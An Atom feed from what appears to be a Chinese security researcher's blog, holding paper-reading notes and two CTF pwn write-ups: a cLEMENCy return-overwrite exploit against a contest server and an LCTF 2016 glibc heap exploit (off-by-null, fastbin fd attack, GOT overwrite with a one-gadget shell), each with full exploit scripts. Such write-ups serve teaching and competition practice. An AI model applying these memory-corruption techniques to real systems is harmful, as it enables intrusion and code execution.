<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>星博‘s</title>
  <subtitle>PHD的自我修养</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://windcarp.github.io/"/>
  <updated>2017-10-19T12:00:52.000Z</updated>
  <id>https://windcarp.github.io/</id>
  
  <author>
    <name>cxm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>论文阅读分享</title>
    <link href="https://windcarp.github.io/2017/09/27/Academic_share/"/>
    <id>https://windcarp.github.io/2017/09/27/Academic_share/</id>
    <published>2017-09-27T13:53:34.000Z</published>
    <updated>2017-10-19T12:00:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>这篇博客会定期分享我阅读论文的笔记。</p>
<p>我读论文一般是写笔记或者做ppt，所以会定期粘贴我的google share链接到这一篇。</p>
<h2 id="1-Address-Oblivious-Code-Reuse-On-the-Effectiveness-of-Leakage-Resilient-Diversity-NDSS17"><a href="#1-Address-Oblivious-Code-Reuse-On-the-Effectiveness-of-Leakage-Resilient-Diversity-NDSS17" class="headerlink" title="1. Address-Oblivious Code Reuse: On the Effectiveness of Leakage-Resilient Diversity(NDSS17)"></a>1. <strong>Address-Oblivious Code Reuse: On the Effectiveness of Leakage-Resilient Diversity(NDSS17)</strong></h2><p>这篇文章来自于MIT的Lincoln实验室，发表在今年的NDSS17上。这篇文章讲述的是针对防御Code Reuse方式的攻击，主要针对Execute Only，提出了一种新的利用方法AOCR(Address Oblivious Code Reuse)，这种方法可以绕过绝大多数的防御。</p>
<p>AOCR的攻击简单概括分两步：</p>
<ol>
<li>找到Indirect code pointer和函数的对应关系</li>
<li>通过Malicious Loop Redirection将找到的Code pointer进行Chaining并调用，完成操作</li>
</ol>
<p>这篇文章最后给出了Nginx和Apache的实际漏洞的利用（未放出代码），并绕过了绝大多数的防御措施。</p>
<p>Paper link：<a href="https://www.ics.uci.edu/~perl/ndss17_aocr.pdf" target="_blank" rel="external">https://www.ics.uci.edu/~perl/ndss17_aocr.pdf</a></p>
<p>Google slide share link：<a href="https://docs.google.com/presentation/d/1fQOzVHJlcpfsPokgQwLm45qBis1P4qX532JWbi89bgA/edit?usp=sharing" target="_blank" rel="external">https://docs.google.com/presentation/d/1fQOzVHJlcpfsPokgQwLm45qBis1P4qX532JWbi89bgA/edit?usp=sharing</a></p>
<h2 id="2-Cyber-Grand-Shellphish-Phrank"><a href="#2-Cyber-Grand-Shellphish-Phrank" class="headerlink" title="2. Cyber Grand Shellphish(Phrank)"></a>2. <strong>Cyber Grand Shellphish(Phrank)</strong></h2><p>本篇叙述了Shellphish在Cyber Grand Challenge中做的一些工作，原文首发于phrank (<a href="http://phrack.org/papers/cyber_grand_shellphish.html)。" target="_blank" rel="external">http://phrack.org/papers/cyber_grand_shellphish.html)。</a></p>
<p>为了方便阅读，故对其进行了重排版，并添加了一些阅读笔记在Google doc里面。</p>
<p>Google doc share link: <a href="https://docs.google.com/document/d/1D5TC2j8gWF6H6kO_me1Qo4Qo3EdR03Rvt7mfFcReR8Q/edit?usp=sharing" target="_blank" rel="external">https://docs.google.com/document/d/1D5TC2j8gWF6H6kO_me1Qo4Qo3EdR03Rvt7mfFcReR8Q/edit?usp=sharing</a></p>
<h2 id="3-SemFuzz-Semantics-based-Automatic-Generation-of-Proof-of-Concept-Exploits"><a href="#3-SemFuzz-Semantics-based-Automatic-Generation-of-Proof-of-Concept-Exploits" class="headerlink" title="3. SemFuzz: Semantics-based Automatic Generation of Proof-of-Concept Exploits"></a>3. <strong>SemFuzz: Semantics-based Automatic Generation of Proof-of-Concept Exploits</strong></h2><p>本篇发表在最新的CCS 2017上，其工作主要是，基于linux kernel，采集CVE和git log中隐含的漏洞信息，通过自然语言处理进行分析，并使用Fuzz的手段（粗粒度和细粒度），产生能运行到漏洞函数的POC exploit。</p>
<p>最终的效果是在满足条件的122个CVE里成功产生了18个Poc，并顺便发现了一个0day和一个Undisclosed漏洞。</p>
<p>本篇的作者来自信工所、Indiana与人民大学，一作是Wei You。</p>
<p>Google doc share link: <a href="https://docs.google.com/presentation/d/1v223Vvh8rmf6Fk5mjVb5uaJ7FnTYYi0XFs9-iypjP3k/edit?usp=sharing" target="_blank" rel="external">https://docs.google.com/presentation/d/1v223Vvh8rmf6Fk5mjVb5uaJ7FnTYYi0XFs9-iypjP3k/edit?usp=sharing</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这篇博客会定期分享我阅读论文的笔记。&lt;/p&gt;
&lt;p&gt;我读论文一般是写笔记或者做ppt，所以会定期粘贴我的google share链接到这一篇。&lt;/p&gt;
&lt;h2 id=&quot;1-Address-Oblivious-Code-Reuse-On-the-Effectiveness-o
    
    </summary>
    
      <category term="Academic" scheme="https://windcarp.github.io/categories/Academic/"/>
    
    
      <category term="Paper" scheme="https://windcarp.github.io/tags/Paper/"/>
    
  </entry>
  
  <entry>
    <title>Pwnhub 线下沙龙CTF之cLEMENCy题解</title>
    <link href="https://windcarp.github.io/2017/08/14/Writeup/"/>
    <id>https://windcarp.github.io/2017/08/14/Writeup/</id>
    <published>2017-08-14T07:27:12.000Z</published>
    <updated>2017-08-14T10:23:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>8月12日Pwnhub第一次沙龙，心想到要和一众大佬面基，心情异常激动，于是攥着讨来的邀请函，冒着12级大雨，满心欢喜的赶到了五环的小别墅~</p>
<p>上午的议题干货满满，有冠城大佬，360小姐姐和青博学弟flyyy的分享，中午的<strong>烧烤 + 德州扑克</strong>之后便是Pwnhub的经典项目CTF，其中Explorer大佬出了一道<code>cLEMENCy</code>架构的题目。</p>
<p>提到<code>cLEMENCy</code>就不得不提到刚过去的<code>Defcon 25 Final</code>。与去年的CGC不同，<code>Defcon Final</code>今年的规则是，主办方与比赛前一天24小时放出自定义架构，以及相应的<code>emulator</code>，留给参赛者24小时的准备时间。这样一来，所有的参赛队都站在了同一起跑线上，需要从0准备所有的工具。</p>
<h2 id="0x01-简介：9bit的奇怪架构"><a href="#0x01-简介：9bit的奇怪架构" class="headerlink" title="0x01 简介：9bit的奇怪架构"></a>0x01 简介：9bit的奇怪架构</h2><p><code>cLEMENCy（the LEgitbs Middle ENdian Computer architecture）</code>由LBS的lighting等大佬们设计。<code>cLEMENCy</code>的指令手册中给出了架构的所有细节。简单的总结如下：</p>
<ol>
<li><p>每字节由9bit组成；使用混合序存储，Register XXYYZZ → Memory YYXXZZ，Register XXYY → Memory YYXX</p>
<blockquote>
<p>“Each byte is 9 bits of data, bit 0 is the left most significant bit. Middle-Endian data stores bits 9 to 17, followed by bits 0 to 8, then bits 18 to 27 in memory when handling three bytes. Two bytes of data will have bits 9-17 then bits 0 to 8 written to memory.”</p>
</blockquote>
</li>
<li><p>内存布局：如下图所示。漏洞利用的目标即把Flag页面开始的一段内存，即flag打印出来。所以说只需要任意地址读就可以了。</p>
<p> <img src="https://ws3.sinaimg.cn/large/006tNc79gy1fija68reuoj310y0hkn1b.jpg" alt=""></p>
</li>
<li><p>指令集：cLEMENCy是RISC，不过最长54bit，指令集和arm有点类似；</p>
</li>
<li><p>寄存器：共31个寄存器，<code>R0</code>一般用于<code>param 1</code>和<code>ret value</code>，<code>ST</code>表示栈，<code>RA</code>表示返回地址。</p>
</li>
<li><p>栈调用：栈有两个增长方向；对栈的操作往往通过<code>STT(Store Tri)</code>指令实现。<code>STTm</code>指令有三种，其中0，1，2分别表示内容存入memory之后<code>rB</code>操作数是增加还是减少，从而表示栈的增长方向。</p>
</li>
</ol>
<p>除此之外，比赛中使用的bianry使用了<code>neatlibc</code>，但为了方便模拟器对io和内存管理进行了一些修改。</p>
<h2 id="0x02-漏洞利用：Ret2Put"><a href="#0x02-漏洞利用：Ret2Put" class="headerlink" title="0x02 漏洞利用：Ret2Put"></a>0x02 漏洞利用：Ret2Put</h2><p>既然是2个小时的CTF，大佬们出题肯定是放足了水233。用IDA大概分析一下，可以发现这是一个简单的伪<code>&quot;Base64&quot;</code>。</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fijbgetydzj312w0ocdoa.jpg" alt=""></p>
<blockquote>
<p>这里用的是<code>Tea Deliverers</code>在比赛时使用的<code>IDA Processor</code>（膜LYM和Explorer和GYC等大佬）。PPP在赛后也放出了他们比赛时使用的<a href="https://github.com/pwning/defcon25-public" target="_blank" rel="external">Utils</a>。</p>
</blockquote>
<p>其中主要的函数<code>read_string</code>:输入一个9bit表示的字符串（交互也全部都是基于9bit），之后会以三字节为单位，转成以三字节为单位的值。如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;AAA\n&apos; -&gt; 0010101</div></pre></td></tr></table></figure></p>
<p>在调用这个函数时，传入的len过长，于是可以溢出上一个函数的返回地址，因此我们可以直接<code>Ret2put</code>，即修改返回地址和参数为<code>Put</code>函数和<code>flag page</code>的地址，即可打印出flag。</p>
<p>观察main_func返回处，<code>LDT R28-RA, [R28 + 0]</code>将R28, ST, RA三个寄存器赋值，是可控的，而puts的参数R0也通过<code>ad. R0, R28, R27</code>控制。</p>
<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fijbr5ncb1j30kx0euq7p.jpg" alt=""></p>
<p>于是构造对应值即可。</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fijc2pzv9uj30iq068gnz.jpg" alt=""></p>
<p>还有一点是，ST要填上一个合法值，否则<code>puts</code>时会<code>crash</code>。但是程序是没有随机化的，所以每次运行都一样。这也导致了比赛时”抄作业(直接重放)”异常方便233</p>
<p>最终代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">import string</div><div class="line"></div><div class="line">def p27(bit24):</div><div class="line">    r = bin(bit24)[2:].rjust(27, &apos;0&apos;)</div><div class="line">    r = r[9:18] + r[0:9] + r[18:27]</div><div class="line">    return r</div><div class="line"></div><div class="line"></div><div class="line">def sb8tosb9(payload):</div><div class="line">    stream = &apos;&apos;.join(bin(ord(x))[2:].rjust(9, &apos;0&apos;) for x in payload)</div><div class="line">    pad = len(stream) % 8</div><div class="line">    if pad != 0:</div><div class="line">        length = len(stream) + (8 - pad)</div><div class="line">    else:</div><div class="line">        length = len(stream)</div><div class="line">    stream = stream.ljust(length, &apos;0&apos;)</div><div class="line">    payload9 = &apos;&apos;.join(</div><div class="line">        chr(int(stream[i:i + 8], 2)) for i in range(0, len(stream), 8))</div><div class="line">    return payload9</div><div class="line"></div><div class="line">def sb9tosb8(payload):</div><div class="line">    stream = &apos;&apos;.join(bin(ord(x))[2:].rjust(8, &apos;0&apos;) for x in payload)</div><div class="line">    length = (len(stream) / 9) * 9</div><div class="line">    stream = stream[:length]</div><div class="line">    return &apos;&apos;.join(</div><div class="line">        chr(int(stream[i:i + 9], 2)) for i in range(0, len(stream), 9))</div><div class="line"></div><div class="line">alphabet = &apos;&apos;</div><div class="line">for i in range(26):</div><div class="line">    alphabet += (chr(i + ord(&apos;A&apos;)))</div><div class="line">for i in range(26):</div><div class="line">    alphabet += (chr(i + ord(&apos;a&apos;)))</div><div class="line">for i in range(10):</div><div class="line">    alphabet += (chr(i + ord(&apos;0&apos;)))</div><div class="line">alphabet += &apos;+/&apos;</div><div class="line">def conventer(bit18):</div><div class="line">    res = &apos;&apos;</div><div class="line">    res += alphabet[int(&quot;0b&quot; + bit18[:6],2)]</div><div class="line">    res += alphabet[int(&quot;0b&quot; + bit18[6:12],2)]</div><div class="line">    res += alphabet[int(&quot;0b&quot; + bit18[-6:],2)]</div><div class="line">    return res</div><div class="line"></div><div class="line"></div><div class="line">p = remote(&quot;54.223.103.62&quot;,10000)</div><div class="line">flag_addr = 0x4010000 + 0x21</div><div class="line">pc_addr = 0x645F</div><div class="line">newpld = 11 * p27(0x414141) + p27(flag_addr) + p27(0x3fffbc7) + p27(pc_addr)</div><div class="line">payload = &apos;&apos;</div><div class="line">for i in range(len(newpld) / 18):</div><div class="line">    payload += conventer(newpld[i*18:(i+1)*18])</div><div class="line">p.send(sb8tosb9(payload + &apos;\n&apos;))</div><div class="line">p.recvn(0x2d)</div><div class="line">data = sb9tosb8(p.recvall(timeout = 1))</div><div class="line">print data</div></pre></td></tr></table></figure>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fijbzy7fl3j30c7014t91.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;8月12日Pwnhub第一次沙龙，心想到要和一众大佬面基，心情异常激动，于是攥着讨来的邀请函，冒着12级大雨，满心欢喜的赶到了五环的小别墅~&lt;/p&gt;
&lt;p&gt;上午的议题干货满满，有冠城大佬，360小姐姐和青博学弟flyyy的分享，中午的&lt;strong&gt;烧烤 + 德州扑克&lt;/s
    
    </summary>
    
      <category term="CTF-Pwn" scheme="https://windcarp.github.io/categories/CTF-Pwn/"/>
    
    
      <category term="Pwn" scheme="https://windcarp.github.io/tags/Pwn/"/>
    
      <category term="CTF" scheme="https://windcarp.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Pwn500：shrink the chunk(LCTF 2016)</title>
    <link href="https://windcarp.github.io/2016/12/27/Test-Blog/"/>
    <id>https://windcarp.github.io/2016/12/27/Test-Blog/</id>
    <published>2016-12-27T07:27:12.000Z</published>
    <updated>2017-10-07T07:29:44.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>这是一篇测试博客。</p>
</blockquote>
<p>XDCTF是国内比较经典的一个CTF了，今年改成LCTF，中间发生的一些剧情也是令人唏嘘啊…</p>
<p>那首先来看这个题目吧，这题综合考察了heap内存管理，shrink the trunk，fastbin corruption， magic alloc和onegadget，还是比较复杂的。</p>
<hr>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先，题目的结构大概如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sender</div><div class="line">    recver</div><div class="line">        package package package</div></pre></td></tr></table></figure></p>
<p>一个bss总指针带出来三条线负责管理。<br>首先要有一个sender，然后用sender可以去新建recver，新建完之后，可以新建package挂在sender上面，每个结构都是通过链表来表示，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">00000000 package_node    struc ; (sizeof=0x20, mappedto_3)</div><div class="line">00000000 next            dq ?                    ; offset</div><div class="line">00000008 prev            dq ?                    ; offset</div><div class="line">00000010 size            dq ?</div><div class="line">00000018 contant         dq ?</div></pre></td></tr></table></figure></p>
<p>但总结来看，就是提供了一个malloc与free 的接口，malloc的大小小于0x208，然后show是用%s输出。</p>
<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>输入函数的off-by-null。这个函数第一次看竟然放过去了。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>根据前面分析的条件，利用可以通过shrink the trunk进行。</p>
<p>其中要注意的是大小，原理是通过修改free small trunk的size字段，使再分配时对下一块prev size和prez inuse的修改无效。那如果再对下一块进行释放，仍然会通过prev size prev inuse进行合并操作，从而造成中间再分配的chunk被大块包含在内。</p>
<p>接下来，可以通过fastbin fd attack进行，前提是leak。<br>我们通过修改链表指针达到leak libc的效果。接下来重来一遍，进行fd attack。</p>
<p>这个fd attack要绕过检查，只能使用上一个字是0x0000的0x7fxxxx的地址进行。假设0x7fff地址是addr，则我们需要输入addr-0x3-0x8才能达到使用效果。</p>
<p>那么问题又来了，因为这里题目会在新分配的块写上0x18的东西，相当于后面的0x18之后才能覆盖，寻找malloc_hook, free_hook, got_table均不行。</p>
<p>随便在附近看看，发现其实malloc_hook hijack后面正好有top_chunk的位置，而且好险可以写低5个字节。</p>
<p>进行尝试，发现main_arena前面flags，虽然覆盖了但是影响不大，我们控制top_chunk到got_table的位置，成功分配了gottable上面。然后里面的函数覆盖为onegadget，才最终弹出shell。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line">init()</div><div class="line">set_sender()</div><div class="line">to_recv_loop()</div><div class="line">set_recver() #test for off-by-one shrink the chunk to get overlaped chunk</div><div class="line">set_package(0x10,&apos;a&apos; * 0x8 + &apos;\n&apos;) #get 0x30 space</div><div class="line">set_package(0x1f0,&apos;b&apos;*0x8 + &apos;\n&apos;) #get 0x210 space</div><div class="line">set_package(0x100,&apos;c&apos;*0x8 + &apos;\n&apos;) #get 0x120 space</div><div class="line">set_package(0x1f0,&apos;z&apos;*0x8 + &apos;\n&apos;)</div><div class="line"></div><div class="line">del_package(3) #free 0x210</div><div class="line">del_package(0) #free 0x30</div><div class="line"></div><div class="line">set_package(0x10,&apos;a&apos; * 0x10 + &apos;\n&apos;) #get 0x30 and change 0x210 -&gt; 0x200</div><div class="line">set_package(0xf0,&apos;e&apos;*0x8 + &apos;\n&apos;) #get 0x110 from unsorted chunk</div><div class="line">set_package(0x10,&apos;f&apos;*0x8 + &apos;\n&apos;) #get 0x30 from unsorted chunk, our target chunk</div><div class="line"></div><div class="line">del_package(2) #free 0x110</div><div class="line">del_package(2) #free 0x120 and get 0x120 + 0x210 space</div><div class="line"></div><div class="line"></div><div class="line">link_header = 0x6030B8</div><div class="line">show_target = 0x603090 #stdout / stdin to leak libc</div><div class="line"></div><div class="line">payload1 = &apos;g&apos; * 0xf8 + p64(show_target) + &apos;\n&apos; #over write 0x110 | 0x30 here</div><div class="line">set_package(0x1f0,payload1) #get 0x210 space and contain the &apos;f&apos; 0x30 chunk</div><div class="line">data =show_package()</div><div class="line">t = data[data.rfind(&quot;length:&quot;):]</div><div class="line">leak_stdout = int(t[7:t.find(&apos;\tcontent:&apos;)],10)</div><div class="line">leak_libc = leak_stdout - offset__IO_2_1_stdout_</div><div class="line">malloc_hook_libc = leak_libc + offset___malloc_hook</div><div class="line">onegadget_libc = leak_libc + off_onegadget</div><div class="line">target = malloc_hook_libc - 0x3 - 0x8#prev 0x7f and -0x3, chunk ptr -0x8</div><div class="line">print &quot;leak_libc: &quot;,hex(leak_libc)</div><div class="line">print &quot;malloc_hook_libc: &quot;,hex(malloc_hook_libc)</div><div class="line">print &quot;onegadget_libc: &quot;, hex(onegadget_libc)</div><div class="line">print &quot;target: &quot;,hex(target)</div><div class="line"></div><div class="line"></div><div class="line">set_package(0x100,&apos;h&apos;*0x8 + &apos;\n&apos;) #get 0x120 chunk and leave</div><div class="line">back_send_loop()</div><div class="line">back_loop()</div><div class="line">init()</div><div class="line"></div><div class="line">set_sender()</div><div class="line">to_recv_loop()</div><div class="line">set_recver() #then use fastbin fd attack, attention we need 0x70 chunk and overwrite it with onegadget</div><div class="line">set_package(0x10,&apos;a&apos; * 0x8 + &apos;\n&apos;) #get 0x30 space</div><div class="line">set_package(0x1f0,&apos;b&apos;*0x8 + &apos;\n&apos;) #get 0x210 space</div><div class="line">set_package(0x100,&apos;c&apos;*0x8 + &apos;\n&apos;) #get 0x120 space</div><div class="line">set_package(0x1f0,&apos;z&apos;*0x8 + &apos;\n&apos;)</div><div class="line"></div><div class="line">del_package(3) #free 0x210</div><div class="line">del_package(0) #free 0x30</div><div class="line"></div><div class="line">set_package(0x10,&apos;a&apos; * 0x10 + &apos;\n&apos;) #get 0x30 and change 0x210 -&gt; 0x200</div><div class="line">set_package(0xf0,&apos;e&apos;*0x8 + &apos;\n&apos;) #get 0x110 from unsorted chunk</div><div class="line">set_package(0x50,&apos;f&apos;*0x8 + &apos;\n&apos;) #get 0x70 from unsorted chunk, our target chunk</div><div class="line"></div><div class="line">del_package(2) #free 0x110</div><div class="line">del_package(2) #free 0x120 and get 0x120 + 0x210 space</div><div class="line">del_package(1) #free 0x70 &apos;f&apos; chunk</div><div class="line">payload2 = &apos;g&apos; * 0xe8 + p64(0x110) + p64(0x70) + p64(target)[:-1] + &apos;\n&apos; #over write 0x110 | 0x30 here</div><div class="line">set_package(0x1f0,payload2) #get 0x210 space and contain the &apos;f&apos; 0x30 chunk</div><div class="line">set_package(0x50,&apos;h&apos; * 0x8 + &apos;\n&apos;) #get 0x70 &apos;f&apos; chunk and turn to &apos;h&apos;</div><div class="line">attach()</div><div class="line">back_send_loop()</div><div class="line">to_recv_loop()</div><div class="line">set_recver()</div><div class="line"></div><div class="line">payload3 = &apos;\x00&apos;*0x4b + &quot;\xf8\x2f\x60&quot; + &apos;\n&apos;</div><div class="line">set_package(0x50,payload3)#get malloc_hook_chunk and set top_chunk to 0x602ff8</div><div class="line">payload4 = p64(onegadget_libc) + p64(onegadget_libc) + &apos;\n&apos;</div><div class="line">set_package(0x1f0,payload4)</div><div class="line">cv(&quot;your choice : &quot;)</div><div class="line">sd(&quot;y&quot;)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;这是一篇测试博客。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;XDCTF是国内比较经典的一个CTF了，今年改成LCTF，中间发生的一些剧情也是令人唏嘘啊…&lt;/p&gt;
&lt;p&gt;那首先来看这个题目吧，这题综合考察了heap内存管理，shrink the t
    
    </summary>
    
      <category term="CTF-Pwn" scheme="https://windcarp.github.io/categories/CTF-Pwn/"/>
    
    
      <category term="Pwn" scheme="https://windcarp.github.io/tags/Pwn/"/>
    
      <category term="CTF" scheme="https://windcarp.github.io/tags/CTF/"/>
    
  </entry>
  
</feed>
